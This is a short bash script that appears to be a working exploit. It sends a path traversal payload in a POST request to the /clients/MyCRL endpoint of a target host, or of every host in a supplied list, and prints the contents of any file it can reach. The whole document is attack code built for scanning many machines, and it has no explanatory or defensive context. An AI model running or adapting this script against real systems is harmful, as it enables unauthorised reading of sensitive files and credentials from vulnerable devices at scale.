#!/bin/bash

# Function to execute the curl command and format the output
function fetch_target_file {
    local target_ip=$1
    local target_file=$2
    response=$(curl --path-as-is -s -k -X 'POST' -H "Host: $target_ip" --data-binary "aCSHELL/../../../../../../../${target_file}" "https://$target_ip/clients/MyCRL")
    
    if [[ -n $response ]]; then
        echo -e "\033[1m$target_ip\033[0m:"
        echo "$response"
    else
        echo -e "\033[1m$target_ip\033[0m: Failed to fetch ${target_file}"
    fi
}

# Check if the correct number of arguments is provided
if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <ip-file|single-ip> <target-file>"
    exit 1
fi

# Read input parameters
input=$1
target_file=$2

# Check if the input is a file or a single IP
if [[ -f $input ]]; then
    # Input is a file
    while IFS= read -r ip; do
        fetch_target_file "$ip" "$target_file"
    done < "$input"
elif [[ -n $input ]]; then
    # Input is a single IP
    fetch_target_file "$input" "$target_file"
else
    echo "Usage: $0 <ip-file|single-ip> <target-file>"
    exit 1
fi
